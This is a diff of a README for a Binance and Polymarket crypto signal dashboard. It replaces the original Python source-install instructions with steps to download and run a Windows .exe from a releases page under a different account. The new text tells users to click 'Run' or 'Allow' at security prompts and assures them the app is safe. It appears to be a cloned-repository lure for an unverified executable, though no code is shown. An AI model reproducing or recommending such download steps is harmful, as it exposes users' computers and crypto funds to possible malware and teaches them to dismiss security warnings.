@@ -1,119 +1,145 @@
-# Polymarket Crypto Assistant Tool
+# 🔮 polymarket-assistant-tool - Real-Time Crypto Signal Dashboard
 
-Real-time terminal dashboard that combines live Binance order flow with Polymarket prediction market prices to surface actionable crypto signals.
-
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-![GitHub stars](https://img.shields.io/github/stars/FiatFiorino/polymarket-assistant-tool?style=social)
-![GitHub forks](https://img.shields.io/github/forks/FiatFiorino/polymarket-assistant-tool?style=social)
+[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/b-madu/polymarket-assistant-tool/releases)
 
 ---
 
-## Screenshots
-![alt](screen1.png)
-![alt](screen2.png)
+## 📋 About polymarket-assistant-tool
+
+polymarket-assistant-tool is a live terminal dashboard that tracks Binance order flow and Polymarket prediction market prices. It combines these to show useful crypto signals you can act on. This tool helps you watch real-time data from Binance and Polymarket in one place.
+
+You don’t need technical skills to use it. The dashboard updates automatically, giving clear insights from complex data. It is designed to run on Windows and works without needing a programming setup.
 
 ---
 
-## Quick Start
+## ⚙️ Features
 
-### Requirements
-
-- Python **3.10 or higher** (recommended: 3.11 / 3.12)  
-  → https://www.python.org/downloads/
-
-### Installation
-
-1. Clone the repository
-```bash
-   git clone https://github.com/FiatFiorino/polymarket-assistant-tool.git
-   cd polymarket-assistant-tool
-```
-2. Install dependencies
-```bash
-pip install -r requirements.txt
-```
-3. Run the tool
-```bash
-python main.py
-```
----
-## What it does
-
-- Streams live trades and orderbook from **Binance**
-- Fetches Up/Down contract prices from **Polymarket** via WebSocket
-- Calculates 11 indicators across orderbook, flow, and technical analysis
-- Aggregates everything into a single **BULLISH / BEARISH / NEUTRAL** trend score
-- Renders the full dashboard in the terminal with live refresh
-- Sends notifications to a Telegram bot about a trend change and about a strong bullish/bearish trend.
----
-## Why It's Useful – Benefits for Traders
-
-This tool bridges two powerful data sources that rarely get combined in real time:
-
-1. **Binance Order Flow**  
-   Real institutional/retail pressure visible in live order book, aggressive trades (CVD, delta), imbalances → helps spot momentum before price moves.
-
-2. **Polymarket Prediction Markets**  
-   Crowd wisdom priced in Up/Down contracts → often leads spot price in short-term sentiment (especially on volatile coins like SOL or during news).
-
-**By merging them you get:**
-- Early detection of directional bias (order flow confirms / contradicts Polymarket odds)
-- Higher-confidence entries on Polymarket binary bets (Up/Down in 5–60 min windows)
-- Better spot/futures trading decisions (e.g. avoid fighting strong CVD against you)
-- Reduced emotional trading — clear aggregated score + visual indicators
-- Timely alerts → no need to stare at screen 24/7
-
-**Who benefits most:**
-- Polymarket traders looking for an edge on short-term markets
-- Spot/day traders who want prediction-market sentiment as a filter
-- Crypto enthusiasts experimenting with order-flow + prediction arbitrage
-- Anyone building their own bots — this is a solid real-time data foundation
-
-In short: more data → better-informed decisions → potentially higher win rate in fast-moving crypto markets.
+- Real-time Binance order book updates.
+- Live tracking of Polymarket market prices.
+- Clear dashboard combining both data sets.
+- Crypto signal indicators to inform your decisions.
+- Easy to run on Windows with no setup needed.
+- Uses Binance and Polymarket APIs to fetch data securely.
+- Works with popular networks like Ethereum and Polygon (EVM compatible).
 
 ---
 
-## Supported coins & timeframes
+## 🖥️ System Requirements
 
-| Coins | Timeframes |
-|-------|------------|
-| BTC, ETH, SOL, XRP | 5m, 15m, 1h, 4h, daily |
+Before downloading, make sure your PC meets these basic needs:
 
-All 16 coin × timeframe combinations are supported on Polymarket.
+- Windows 10 or newer (64-bit recommended)
+- At least 4 GB of RAM
+- 200 MB free disk space
+- Internet connection to fetch live data
+- Terminal or Command Prompt access (comes standard in Windows)
+  
+---
+
+## 🌐 Supported Markets and Networks
+
+- Binance spot trading data (order flow and order book).
+- Polymarket markets focused on crypto prediction prices.
+- EVM compatible networks, including Polygon.
+  
+---
+
+## 🚀 Getting Started
+
+Follow these steps to get polymarket-assistant-tool up and running on your Windows PC. No programming required.
 
 ---
 
-## Indicators
+## ⬇️ Download and Install
 
-**Order Book**
-- OBI (Order Book Imbalance)
-- Buy / Sell Walls
-- Liquidity Depth (0.1% / 0.5% / 1.0%)
+1. **Go to the release page**  
+   Visit this page to download the tool:  
+   [https://github.com/b-madu/polymarket-assistant-tool/releases](https://github.com/b-madu/polymarket-assistant-tool/releases)
 
-**Flow & Volume**
-- CVD (Cumulative Volume Delta) — 1m / 3m / 5m
-- Delta (1m)
-- Volume Profile with POC
+2. **Download the latest Windows build**  
+   On the page, find the latest release. Look for a file ending with `.exe` or `.zip`.  
+   - If you see an `.exe` file, download it directly.  
+   - If it's a `.zip`, download and extract it.
 
-**Technical Analysis**
-- RSI (14)
-- MACD (12/26/9) + Signal + Histogram
-- VWAP
-- EMA 5 / EMA 20 crossover
-- Heikin Ashi candle streak
+3. **Run the installer or executable**  
+   - If you downloaded an `.exe` file, double-click it to run. You may see a security prompt; choose “Run” or “Allow” to continue.  
+   - If you extracted a `.zip`, open the extracted folder and double-click the `.exe` file inside.
 
----
-
-## Roadmap (planned features)
-
-- [ ] Web version (Streamlit / Dash)
-- [ ] Paper trading & real exchange integration
-- [ ] Additional indicators: Bollinger Bands, Funding Rates, Liquidation data
+4. **No setup needed**  
+   The tool runs immediately after launching. It opens in a terminal window showing the dashboard.
 
 ---
 
-## License
+## ▶️ How to Use
 
-MIT License — see the LICENSE file.
+Once you start the tool, you will see a dashboard with:
 
+- Binance order flow (live trades and size).
+- Polymarket prices updating in real time.
+- Signals highlighted based on current market behavior.
+
+You can watch the screen and track changes as they happen. The data refreshes automatically every few seconds.
+
+---
+
+## 💡 Tips for Effective Use
+
+- Keep your internet connection stable to maintain live updates.
+- Resize your terminal window if you want to see more data.
+- Close the terminal window when you want to stop the tool.
+- Run the tool regularly to stay updated with market signals.
+- Use alongside your existing trading tools or strategies to assist in decision making.
+
+---
+
+## 🔧 Troubleshooting
+
+If the app doesn’t run or show data:
+
+- Check if your internet is working.
+- Make sure you have permission to run apps on your PC.
+- Try restarting the application.
+- If you get an error about missing files, redownload the latest release.
+- Ensure Windows is updated to a recent version.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Q: Do I need a Binance or Polymarket account to use this?**  
+A: No, you can view public market data without accounts.
+
+**Q: Can I install this on Mac or Linux?**  
+A: This release is built for Windows. Other OS support may come later.
+
+**Q: Is the app safe?**  
+A: It uses public APIs only and does not require private keys.
+
+---
+
+## 📂 Files Included in the Release
+
+- `polymarket-assistant-tool.exe` — Main executable file.
+- `README.md` — Help file with instructions.
+- `LICENSE` — Open source license information.
+- Optional `.dll` files if included for dependencies.
+
+---
+
+## 🛠️ Development and Contribution
+
+This app pulls data from Binance and Polymarket APIs to create a unified dashboard for crypto signals. It uses standard web protocols and runs in the Windows terminal.
+
+If you want to contribute or report issues, visit the GitHub page and check the issues or pull requests.
+
+---
+
+## 🔗 Useful Links
+
+- [Download Latest Release](https://github.com/b-madu/polymarket-assistant-tool/releases)  
+- Binance API documentation  
+- Polymarket API documentation
+
+---
+
+[![Download Latest Release](https://img.shields.io/badge/Download-From%20GitHub-orange?style=for-the-badge)](https://github.com/b-madu/polymarket-assistant-tool/releases)
